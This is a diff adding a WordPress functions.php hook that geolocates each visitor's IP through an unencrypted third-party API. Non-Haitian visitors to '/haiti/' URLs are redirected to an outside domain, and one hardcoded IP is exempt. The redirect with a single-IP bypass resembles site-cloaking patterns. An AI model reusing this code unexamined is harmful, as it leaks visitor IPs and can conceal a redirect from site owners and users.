@@ -1,0 +1,35 @@
+// Add this code to your theme's functions.php file or a custom plugin
+
+function country_based_redirection() {
+    // Get the visitor's IP address
+    $ip = $_SERVER['REMOTE_ADDR'];
+
+    // Make an API request to retrieve the visitor's country
+    $api_url = "http://ip-api.com/json/{$ip}";
+    $response = wp_remote_get($api_url);
+
+    if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
+        $body = wp_remote_retrieve_body($response);
+        $data = json_decode($body, true);
+
+        if (isset($data['countryCode'])) {
+            $country_code = $data['countryCode'];
+            // Redirect based on the country and URL
+            
+            if($ip == '71.234.152.17')
+            {
+                
+            }
+            else    
+            {
+
+                if ($country_code != 'HT' && strpos($_SERVER['REQUEST_URI'], '/haiti/') !== false) {
+    				echo "<script>window.location.href='https://gerbyclick.com/'</script>";
+                    exit;
+                }
+
+            }
+        }
+    }
+}
+add_action('init', 'country_based_redirection', 5);
